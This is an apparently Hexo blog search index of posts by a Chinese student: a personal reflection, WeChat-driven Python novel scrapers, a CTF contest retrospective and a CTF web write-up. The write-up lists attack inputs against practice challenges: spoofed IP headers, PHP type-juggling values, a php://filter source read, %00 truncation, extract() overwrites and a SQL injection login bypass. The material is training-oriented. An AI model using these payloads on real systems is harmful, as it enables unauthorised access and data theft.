<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[前路漫漫，未来可期]]></title>
    <url>%2F2018%2F12%2F17%2F%E6%9C%AA%E6%9D%A5%E5%8F%AF%E6%9C%9F%2F</url>
    <content type="text"><![CDATA[删删减减很多遍，就这样吧！ 人生无所谓时间长短，重要是不虚度。 回忆自己那满满的20年，从出生几个月后母亲因家庭贫穷而离开，到如今20岁还碌碌无为的活着，不禁感到愧对家人，一个本是家庭希望的人，却活成了一个凡人。这里的”不虚度”不是总结，而是反思。 开始九年义务教育之前，感觉自己没什么不同，随奶奶一起去割草喂牛、去亲戚家玩到不回家也算是上学以前唯一的记忆了。 上学以后，生活方式就变了，忘记是二年级还是三年级，开始伙同一路上学的伙伴逃课被罚跪，或许从那时起，就养成了一种叛逆的性格吧，但是我好像天生就会隐藏这项技能，隐藏自己的感情，隐藏自己的目标等等，所以表面上的我仍然是老师眼中的优秀学生，这种表象一直持续到六年级，直到班主任把我叫出去问我那个女孩有什么好的！或许是因没影响成绩，老师也就不再管我。到了初二，玩手机，打篮球，和老师眼中的”混混”一起”混”等等情况的发生可能让老师重新认识我了吧，但是那时候却是我最开心的日子，和他们一起游泳，一起爬树摘李子等等！哈哈哈！那时认识的”混混”可能这辈子都不会忘了，事实也是如此，这就是所谓:混即是生活吧！ 高中应该是人生最失败的一个阶段，从乡村小学到全县城最好的中学上学或许已经值得炫耀一段时间了，可这才是堕落的开始。高一的成绩名列也算前茅，大二开始被说服去当兵，这件事自己应该负全责吧，家人因为眼前的利益而冲动，自己却被那一丝厌学的情绪所左右，后来学习渐渐落下了，也慢慢放弃了。而高中最后悔的事却是因为饭卡的事情产生对同学的愧疚，现在再次向那位刘同学道歉，真的对不起！明知这是犯罪，却仍然做了，对不起。虽然高中班主任依然很渣，但人生越往后走，越觉得自作孽真的不能怪社会，或许那时候好好学习天天向上人生真的会不一样吧！！ 关于家庭自己家庭条件不好，家里有3个人，很幸福吧？我，父亲，祖父。而已。但也很满足了，我也不敢接受比这更坏的结果。我不是光脚的，我有害怕失去的东西，比任何人都害怕失去，我害怕失败，很可笑吗？我不觉得，每个人都有底线，我如果失去了底线，我就真的没了。不过还好，我还算乐观，我也正试图努力改变现状，谁会逢人便说自己的志向有多远大呢？ 关于爱情人都渴望被爱，对于一个失去母亲的人而言，这一点更加不可取代。高中以前的爱情是每天能一起玩，但是由于性格原因只能隐藏。高中的爱情却是因自己的不成熟，不知道那就是爱情。到了大学想的更多的不再是两个人的事，而是提高自己，因为家庭的原因，我肩负的责任不允许我只考虑自己，我需要先为别人想，不管这个”别人”是我父亲，我爷爷，或者是以后另一半，如果我浑浑噩噩，家庭条件得不到改变，内心的折磨是我不能忍受的。所以我不急，我渴望的爱情是以衣食住行无压力为基础的。 关于代码每个人都有自己喜欢的事物，当你把一个东西看成一种爱好的时候，你就会很乐意去做，并不知疲倦。可能每个把程序当爱好的程序员都喜欢没有欺骗的代码世界吧，当计算机按照你的命令做你吩咐的事的时候，你就会沉浸在这种成就感中。 20岁以后从网上看到这样一句话 在这个不知所措的年纪，好像一切都那么不尽人意。 或许应该这样理解：现阶段，我们的追求和自己的能力并不匹配，总想要有一番事业，有自己爱的人，可是由于实力的限制反而让自己患得患失。而努力的意义，不就是在未来的日子里,可以选择自己喜欢的人和事。 关于未来既然已经知道这一生不会一帆风顺，那么就应该认真地走接下来的路。苏乞儿，加油！ 前路漫漫，未来可期！]]></content>
      <categories>
        <category>江湖</category>
      </categories>
      <tags>
        <tag>江湖</tag>
        <tag>20岁</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取全书网指定书籍-server版]]></title>
    <url>%2F2018%2F12%2F15%2F%E7%88%AC%E5%8F%96%E5%85%A8%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B9%A6%E7%B1%8D-server%E7%89%88%2F</url>
    <content type="text"><![CDATA[虽然不看小说了，但是还是分享出来吧！ 实现功能微信端发送小说名到指定微信号（格式：小说名suqir作者），服务器开始在全书网(http://www.quanshuwang.com)爬取该小说，爬取完成后将询问是否下载，确认后将通过微信以文件的形式发送。 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#!/usr/bin/python#coding:utf-8import urllib.requestimport requests,reimport itchatfrom itchat.content import *class BookSpyder(object): &quot;&quot;&quot;爬取指定小说-server版&quot;&quot;&quot; def __init__(self, book_name,book_author): super(BookSpyder, self).__init__() self.book_author = book_author self.headers = &#123;&apos;User-Agent&apos;: &apos;User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&apos;&#125; self.url = &apos;http://www.quanshuwang.com/modules/article/search.php?searchkey=&apos;+urllib.request.quote(book_name.encode(&apos;gb2312&apos;))+&apos;&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22&apos; search_data = requests.get(self.url,headers=self.headers,allow_redirects=False) try: # 搜索结果唯一时 self.location = search_data.headers[&apos;location&apos;].split() self.location2res(self.location[0]) except KeyError: self.location = re.findall(r&apos;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;.*?title=&quot;(.*?)&quot;.*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href=&apos;,search_data.content.decode(&apos;gbk&apos;)) for http in self.location: flag = self.location2res(http[0]) if flag == 1: break #link self.booklink = re.findall(r&apos;class=&quot;leftso png_bg&quot;&gt;&lt;a href=&quot;(.*?)&quot;&apos;,self.res)[0] #正则匹配书名 self.book_name = re.findall(r&apos;&lt;meta property=&quot;og:title&quot; content=&quot;(.*?)&quot;/&gt;&apos;,self.res)[0] response = requests.get(self.booklink,headers=self.headers).content.decode(&apos;gbk&apos;) #正则匹配所有章节及其链接 self.contents = re.findall(r&apos;&lt;li&gt;&lt;a href=&quot;(.*?)&quot; title=&quot;(.*?)&quot;&gt;.*?&lt;/a&gt;&lt;/li&gt;&apos;,response) #总章数 self.len = len(self.contents) def location2res(self,location): flag = -1 self.res = requests.get(location,headers=self.headers).content.decode(&apos;gbk&apos;) author = re.findall(r&apos;&lt;meta property=&quot;og:novel:author&quot; content=&quot;(.*?)&quot;&apos;,self.res)[0] if self.book_author == author: flag = 1 try: self.description = re.findall(r&apos;介绍:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;/div&gt;&apos;,self.res,re.S)[0].replace(&apos;&amp;nbsp;&apos;,&apos;&apos;).replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;) except IndexError: pass return flag def save(self): i = 0 #开始写入文件 with open(&apos;./book/suqir.txt&apos;,&apos;w&apos;,encoding=&apos;utf-8&apos;,errors=&apos;ignore&apos;) as text_save: text_save.write(self.book_name+&apos;\n作者：&apos;+self.book_author) if &apos;self.description&apos; in dir(): text_save.write(&apos;\n简介：&apos;+self.description) text_save.write(&apos;\n&apos;) for num in self.contents: #获取单章文本 text_r = requests.get(num[0],headers=self.headers) text_c = text_r.content text = text_c.decode(&apos;gb18030&apos;) #获取章节名 title = num[1].replace(re.findall(r&apos;，共\d*字&apos;,num[1])[0],&apos;&apos;) try: #正则匹配内容 text = re.findall(r&apos;&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type=&quot;text/javascript&quot;&gt;&apos;,text,re.S)[0] #数据清洗 text = text.replace(&apos;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;,&apos;&apos;) text = text.replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;) text = text.replace(&apos;\r\n\r\n&apos;,&apos;\r\n&apos;) text_save.write(&apos;\n&apos;) text_save.write(title) text_save.write(&apos;\n\n&apos;) text_save.write(text) text_save.write(&apos;\n&apos;) print(&apos;[*]%-30s\t完成度%.3f%%&apos;%(title,(i+1) * 100 / self.len)) i += 1 except IndexError as e: print(&apos;【*】%s下载失败&apos;%title) text_save.write(&apos;\n===全书完===\n==by苏乞儿==\n&apos;) def get_bookname(self): return self.book_name def get_bookauthor(self): return self.book_author def get_des(self): try: return self.description except AttributeError: return &apos;无简介&apos; def get_centents(self): return self.len def get_booklink(self): return self.booklinkdef getUserName(): itchat.auto_login(hotReload=True,enableCmdQR=2) onlyUser = itchat.search_friends(name=&apos;杰帅&apos;) return onlyUser[0][&apos;UserName&apos;]@itchat.msg_register([TEXT],isFriendChat=True)def text_reply(msg): global userName if msg[&apos;FromUserName&apos;] == userName: try: bookName,bookAuthor = msg[&apos;Text&apos;].split(&apos;suqir&apos;) book = BookSpyder(bookName,bookAuthor) itchat.send(&apos;书名：%s\n作者：%s\n简介：%s&apos; % (bookName,bookAuthor,book.get_des()),toUserName=userName) itchat.send(&apos;正在爬取《%s》...&apos; % bookName,toUserName=userName) print(&apos;[*]正在爬取《%s》...&apos; % bookName) book.save() itchat.send(&apos;爬取完毕！是否下载？(是/否)&apos;,toUserName=userName) except ValueError: if msg[&apos;Text&apos;] == &apos;是&apos;: print(&apos;[*]正在发送文件...&apos;) itchat.send(&apos;正在上传...&apos;,toUserName=userName) itchat.send_file(&apos;./book/suqir.txt&apos;,toUserName=userName) print(&apos;[*]已发送文件！\n等待下次请求...&apos;) itchat.send(&apos;感谢使用！&apos;,toUserName=userName) elif msg[&apos;Text&apos;] == &apos;否&apos;: itchat.send(&apos;已取消，感谢使用！&apos;,toUserName=userName)if __name__ == &apos;__main__&apos;: print(&apos;[*]Starting...&apos;) userName = getUserName() itchat.run() 运行部分截图服务器端 客户端]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用微信实现小说更新提醒]]></title>
    <url>%2F2018%2F11%2F26%2F%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%2F</url>
    <content type="text"><![CDATA[继上一篇关于爬书的文章后，我堕落的看起了小说。人生最痛苦的事莫过于—小说断更了!不过世界总是需要懒人的，因为有了懒人创造世界。这话不是我说的，是马爸爸说的： 懒不是傻懒，如果你想少干，就要想出懒的方法。要懒出风格，懒出境界。——马云 为此我专门买了一台服务器（9.9还包邮哦），反正以后还有很多地方用到服务器。 扯远了。。。利用服务器可以干很多事，比如接下来的利用微信第三方python库实现小说更新时通过微信将更新内容发给指定朋友。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/python#coding:utf-8import time,itchat # 微信登录def vxLogin(rename): # enableCmdQR：在命令行中显示登录二维码，参数2是Linux系统下的字符宽度 itchat.auto_login(hotReload=True,enableCmdQR=2) friends = itchat.get_friends(update=True) for friend in reversed(friends): if friend[&apos;RemarkName&apos;] == rename: toName = friend[&apos;UserName&apos;] return toName# 检查更新def update(url,start,toName): import requests,re res = requests.get(url).content.decode(&apos;gb18030&apos;) lis = re.findall(r&apos;&lt;li&gt;&lt;a href=&quot;(.*?)&quot; title=&quot;(.*?)，.*?&quot;&gt;&apos;,res) toName = vxLogin(rename=toName) for li in lis[start:]: end_str = li[1] try: end = int(re.findall(r&apos;第[ ]?(.*?)[ ]?章&apos;,end_str)[0]) except ValueError: print(&apos;[*]小说更新了，但是章节序号为中文，我暂时不想处理。。。&apos;) #碰到这种情况再更新，懒 exit() if end &gt;= start+1: text = requests.get(li[0]).content.decode(&apos;gbk&apos;) re_text = re.findall(r&apos;&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script&apos;,text,re.S)[0] re_text = re_text.replace(&apos;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;,&apos;&apos;) re_text = re_text.replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;) re_text = re_text.replace(&apos;\r\n\r\n&apos;,&apos;\r\n&apos;) re_text = &apos;%s\n%s\n\n&apos; %(li[1],re_text) print(&apos;更新：%s&apos; % li[1]) text = &apos;最近更新了第%s章\n%s&apos; % (end,re_text) length = len(text)//3 # 分3段发送 itchat.send(msg=text[:length], toUserName=toName) itchat.send(msg=text[length:(length*2)], toUserName=toName) itchat.send(msg=text[(length*2):], toUserName=toName) time.sleep(5) print(&apos;[*]更新完成！暂无最新章节&apos;) # 声明startNum为全局变量，这样就不会在这个函数内部新建变量 global startNum startNum = end time.sleep(3600)# 1小时更新检查一次if __name__ == &apos;__main__&apos;: print(&apos;[*]Starting...&apos;) # 当前最新章节 startNum = 410 while True: update(url=&apos;http://www.quanshuwang.cn/book/137/137120&apos;,start=startNum,toName=&apos;杰帅&apos;)# toName为None时发给自己 # 持续运行 itchat.run() 这里的urlhttp://www.quanshuwang.cn/book/137/137120是我看的《一步偷天》在全书网的网址 运行结果服务器端： 微信端： 小说也看完了，终于又可以开始写bug了！！ 另外，这个个人博客只作分享交流技术用，大爷们不用打赏，真的不用，真的不用，（疯狂暗示中…）]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取全书网指定书籍]]></title>
    <url>%2F2018%2F11%2F07%2F%E7%88%AC%E5%8F%96%E5%85%A8%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B9%A6%E7%B1%8D%2F</url>
    <content type="text"><![CDATA[更新（2018年11月26日）： 后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里：最近看了一部基于小说改编的电视剧，闲的无聊就去看了看小说。但是大多数看书网站都有或多或少的广告，强迫症表示很难受，加之近来正在学习Python，便想着利用Python爬取小说的内容，远离广告的‘宠信’。 实现原理程序实现原理很简单，将用户输入的书名提交到全书网进行搜索，将返回的结果存在list中并展示给用户，对用户选择的书籍进行书籍内容的爬取，并写入文件。 问题初次学习写这种爬虫，代码难免冗余难读，但关键部分均写有注释，在此分享出来以作交流。在实际操作过程中也遇到不少问题，比如：如果所查询的书籍在全书网中只有唯一的一本，全书网将直接通过location进行重定向到书籍详情页，与多本书的处理方式不一致，所以为了完美的获取书记简介必须写个if判断；再如：用户提交的书名必须经过gb2312编码并转urlencoding后才能查询到，否则服务器返回错误。。。不过，也可能是我第一次写，有更好的处理方法，希望自己继续努力吧！ 源代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151# -*- coding: utf-8 -*-import requests,sys,reimport urllib.requestclass Bookspider(object): &quot;&quot;&quot;爬取全书网指定书籍并下载到本地&quot;&quot;&quot; def __init__(self): super(Bookspider, self).__init__() self.request = requests.session() self.headers = &#123; #随机指定user-agent &apos;User-Agent&apos;: &apos;User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&apos; &#125; def book_search(self,name): print(&apos;[*]搜索中...&apos;) #全书网的搜索url #对name进行url编码：urllib.request.quote self.url = &apos;http://www.quanshuwang.com/modules/article/search.php?searchkey=&apos;+urllib.request.quote(name.encode(&apos;gb2312&apos;))+&apos;&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22&apos; #禁止重定向：allow_redirects=False search_data = self.request.get(self.url,headers=self.headers,allow_redirects=False) try: #所爬书籍唯一时被重定向到location self.location = search_data.headers[&apos;location&apos;] #将str的location转换成list，方便计算length self.location = self.location.split() except KeyError as e: response = search_data.content.decode(&apos;gbk&apos;) #所爬书籍有多种结果时，返回所有书籍信息 self.location = re.findall(r&apos;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;.*?title=&quot;(.*?)&quot;.*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href=&apos;,response) return self.location def book_info(self): res = requests.get(self.location,headers=self.headers).content.decode(&apos;gbk&apos;) #正则匹配书名 self.bookname = re.findall(r&apos;&lt;meta property=&quot;og:title&quot; content=&quot;(.*?)&quot;/&gt;&apos;,res)[0] #正则匹配书籍作者 self.author = re.findall(r&apos;&lt;meta property=&quot;og:novel:author&quot; content=&quot;(.*?)&quot;/&gt;&apos;,res)[0] #正则匹配书记简介 re.S指定多行匹配 self.description = re.findall(r&apos;&lt;meta property=&quot;og:description&quot; content=&quot;(.*?)&quot;/&gt;&apos;,res,re.S)[0].replace(&apos;&amp;nbsp;&apos;,&apos;&apos;).replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;).replace(&apos; &apos;,&apos;&apos;) #正则匹配书籍目录 self.booklink = re.findall(r&apos;class=&quot;leftso png_bg&quot;&gt;&lt;a href=&quot;(.*?)&quot;&apos;,res)[0] response = requests.get(self.booklink,headers=self.headers).content.decode(&apos;gbk&apos;) #正则匹配所有章节及其链接 self.contents = re.findall(r&apos;&lt;li&gt;&lt;a href=&quot;(.*?)&quot; title=&quot;(.*?)&quot;&gt;.*?&lt;/a&gt;&lt;/li&gt;&apos;,response) #总章数 self.len = len(self.contents) def save(self): i = 0 #开始写入文件 with open(&apos;%s.txt&apos;%self.bookname,&apos;w&apos;,encoding=&apos;utf-8&apos;,errors=&apos;ignore&apos;) as text_save: text_save.write(self.bookname+&apos;\n作者：&apos;+self.author) text_save.write(&apos;\n简介：&apos;+self.description) text_save.write(&apos;\n&apos;) for num in self.contents: #获取单章文本 text_r = requests.get(num[0],headers=self.headers) text_c = text_r.content text = text_c.decode(&apos;gbk&apos;) #获取章节名 title = num[1].replace(re.findall(r&apos;，共\d*字&apos;,num[1])[0],&apos;&apos;) try: #正则匹配内容 text = re.findall(r&apos;&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type=&quot;text/javascript&quot;&gt;&apos;,text,re.S)[0] except IndexError as e: print(&apos;【**】%s下载失败&apos;%title) #数据清洗 text = text.replace(&apos;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;,&apos;&apos;) text = text.replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;) text = text.replace(&apos;\r\n\r\n&apos;,&apos;\r\n&apos;) text_save.write(&apos;\n&apos;) text_save.write(title) text_save.write(&apos;\n\n&apos;) text_save.write(text) text_save.write(&apos;\n&apos;) print(&apos;[*]%-30s\t完成度%.3f%%&apos;%(title,(i+1) * 100 / self.len)) i += 1 text_save.write(&apos;\n===全书完===\n==by苏乞儿==\n&apos;) def get_item(self): item = len(self.location) return item def set_location(self,location): self.location = location def get_bookname(self): return self.bookname def get_author(self): return self.author #获取总章数 def get_chapter(self): return self.len def get_description(self): return self.descriptionif __name__ == &apos;__main__&apos;: book = Bookspider() name = input(&apos;[*]请输入书名：&apos;) #查书 locations = book.book_search(name) item_sum = book.get_item() #以下为两种搜索结果的处理，1.所爬的书籍在全书网是唯一的，2.所爬的书籍在全书网有多本 if item_sum == 1: book.set_location(locations[0]) book.book_info() print(&apos;[*]%s共%d条搜索结果：\n&apos;%(name,item_sum)) print(&apos;#&apos;*150) print(&apos;[*]书名：%s&apos;%book.get_bookname()) print(&apos;[*]作者：%s&apos;%book.get_author()) print(&apos;[*]简介：%s&apos;%book.get_description()) print(&apos;#&apos;*150) choose1 = input(&apos;[*]是否继续下载？(y/n)&apos;) if choose1 == &apos;y&apos; or choose1 == &apos;Y&apos;: print(&apos;\n[*]正在下载《%s》&apos;%book.get_bookname()) #保存文本 book.save() else: print(&apos;\n[*]感谢使用！&apos;) sys.exit(1) else: j = 0 print(&apos;[*]%s共%d条搜索结果：\n&apos;%(name,item_sum)) for item in locations: print(&apos;#&apos;*150) print(&apos;[*]序号：%d&apos;%(j+1)) print(&apos;[*]书名：%s&apos;%item[1]) print(&apos;[*]作者：%s&apos;%item[2]) print(&apos;[*]简介：%s&apos;%item[3]) print(&apos;#&apos;*150) j +=1 choose2 = int(input(&apos;\n\n请选择序号：&apos;)) if choose2 &gt;= 1 and choose2 &lt;= item_sum: print(&apos;\n[*]正在下载《%s》&apos;%locations[choose2-1][1]) #设置书籍链接地址 book.set_location(locations[choose2-1][0]) book.book_info() #保存文本 book.save() else: print(&apos;\n[*]感谢使用！&apos;) sys.exit(1) print(&apos;\n[*]下载成功！&apos;) 部分运行截图： 下载的文本文件：]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次CTF大赛的感受]]></title>
    <url>%2F2018%2F10%2F29%2F%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97%2F</url>
    <content type="text"><![CDATA[经常对过去的成功或不足进行总结，是一件很有逼格的事情。 前言10月27号的山东省网络技术大赛是我大学参加过的第一个比赛，在这个比赛中我和各大高校的大佬们共同在网络攻防CTF夺旗赛这一命题中进行角逐。其实在去之前我的心里是没有多少信心的（事实证明我的担心是有必要的），同时寄希望于其他选手水平也差不多，我也只看过一些基础的web方向的解题方法，只看过几篇关于隐写的题，因为在我看来这种比赛应该不会涉及到密码，逆向，溢出和隐写等等这几类题，然而。。。 先分享一下我比赛最后的排名情况： 我的成绩在里面不是特别理想，在39名选手中排在第11位，得分仅331，与前三名一千多的得分更是有着不小的差距（小声哔哔：前三是来自警察学院的未来的网警），但究其根本还是自己在网络安全这一领域还有很长的路要走。 下面是在这次比赛中我得到的一些经验和教训，特地分享出来，一来警示自己，二来以作交流。另外，我会在后面把所有题做一遍并写一篇write up(如果官方还没有关闭训练场) 先谈不足 过分自信，轻视对手 解题时心静不下来，导致做题时没有深入，往往错过很多会做的题 没有设立明确的目标，导致会的题因为较其他选手稍晚得到flag，得分较低；不会的题又没有尝试去解 在网络安全领域坐井观天，没有保持一颗学习的心态 再说受益 心中始终坚信：学无止境 积累了大赛经验，后续参加此类比赛不至于手忙脚乱 坚守自己的底线 最后展望在经历了此次比赛后，虽然没有取得满意的成绩，但也更加坚定了对未来继续扩展学习方向的信心。接下来的近一年时间，我将根据时间安排准备下一届的网络安全大赛，同时进行PHP、Python等语言的学习，争取将各个CTF大赛的题看一遍write up或自己试解，希望能在下一届的比赛中获得一个令自己比较满意的成绩。 人生没有退路，只有不停地选择！ –苏乞儿]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>旅行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF的常见write up]]></title>
    <url>%2F2018%2F10%2F12%2FCTF%2F</url>
    <content type="text"><![CDATA[本文总结了CTF中我所遇到的题型及其write up，本文长期更新 希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！ 训练场：南京邮电大学CTF题库 直接查看源码出现场景：一般出现在第一题 write up： 直接Ctrl+u查看网页源码寻找flag 修改maxlength出现场景：输入框输入内容有位数限制 write up：F12进入开发者模式修改maxlength后提交 IP伪造各种伪造IP的HTTP头： 序号 伪造方式 1 X-Forwarded-For 2 Client-IP 3 x-remote-IP 4 x-originating-IP 5 x-remote-addr 进制转换源码：123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&apos;1&apos;); $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &apos;54975581388&apos;;&#125;$flag=&apos;*******&apos;;if(noother_says_correct($_GET[&apos;key&apos;])) echo $flag;else echo &apos;access denied&apos;;?&gt; 分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc,因此get方法传值key=0xccccccccc PHP弱类型类型一介绍：PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0 出现场景：PHP代码审计、含md5的题 write up： 修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较 扩展：0e开头MD5值小结 string md5() s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 类型二源码： 1234567if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) &#123;if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])if (md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))die(&apos;Flag: &apos;.$flag);elseprint &apos;Wrong.&apos;;&#125; 分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null） 脑洞题 源码找url 源码看flag jjencode/aaencode（颜文字）介绍： 什么是jjencode? 将js代码转换成只有符号的字符串 什么是aaencode？ 将js代码转换成常用的网络表情 aaencode加密：http://utf-8.jp/public/aaencode.html 解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。 文件包含漏洞典型的文件包含漏洞的格式网址：php?file=xxx.php 原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的 利用方法：构建file=php://filter/read=convert.base64-encode/resource=index.php 注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。 注意：python3中base64的解密为base64.b64decode() mysql 精度问题 intval()这个函数的作用是把参数自动转换成整数（int） $id = intval(1024.5)//结果为$id==1024 robots.txt介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。 %00源码：12345678if (isset ($_GET[&apos;nctf&apos;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;;&#125; 涉及漏洞：查到资料 1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00 2.当ntf为数组时它的返回值不是FALSE 利用方法： 1.?nctf=1%00%23biubiubiu 2.?nctf[]=1 变量覆盖源码：123456789&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; 分析：extract()函数的作用：从数组中将变量导入到当前的符号表 可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表 由于extract()函数存在变量覆盖漏洞，所以提交post参数： pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123 即:将两个变量的值修改成相同的，即可得到flag！ 上传绕过源码：123456789文件上传&lt;br&gt;&lt;br&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt; 0x00截断绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00 SQL注入常规注入正常闭合源码：1234567891011121314151617&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user]; 分析：会对传入参数两端去空格，然后sql拼接如下 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; 所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。 MySQL主要有三种注释方式： 注释方式 说明 # 注释到行尾 /*内容*/ 用于行间或多行注释（也可用/**/代替空格） – 也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1– ） 解法：本题可post：user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123 sql语句就变成select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;) 